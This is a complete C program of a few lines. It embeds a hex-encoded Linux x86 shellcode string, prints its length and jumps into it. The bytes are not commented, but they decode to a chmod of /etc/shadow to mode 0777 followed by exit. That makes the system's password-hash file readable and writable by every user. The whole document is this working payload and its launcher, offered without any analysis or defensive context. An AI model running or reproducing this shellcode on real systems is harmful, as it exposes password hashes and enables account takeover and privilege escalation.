#include <stdio.h>
#include <string.h>
int main(){
unsigned char shellcode[]= "\x6a\x0f\x58\x68\x90\x90\xff\x01\x59\xc1\xe9\x10\x68\x90\x64\x6f\x77\x5b\xc1\xeb\x08\x53\x68\x2f\x73\x68\x61\x68\x2f\x65\x74\x63\x89\xe3\xcd\x80\xb0\x01\xb3\x01\xcd\x80";
fprintf(stdout,"Length: %d\n\n",strlen(shellcode));
    (*(void(*)()) shellcode)();
}
